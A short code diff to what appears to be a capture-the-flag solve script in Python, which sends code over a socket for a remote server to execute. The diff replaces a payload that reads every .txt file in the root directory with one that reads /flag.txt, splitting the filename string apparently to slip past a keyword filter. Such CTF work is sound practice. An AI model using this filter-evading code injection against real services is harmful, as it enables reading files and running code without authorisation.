@@ -14,8 +14,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 	print("Feedback from server: ", feedback)
 
 	# Run your Python code and save the output to a variable
-	#payload = b"print(open('/flag.txt').read())" 
-	payload = b"print('\n'.join(open(file).read() for file in os.listdir('/') if file.endswith('.txt')))"
+	payload = b"print(open('/fla'+'g.txt').read())" 
 
 	# Send the output to the server
 	s.sendall(payload)
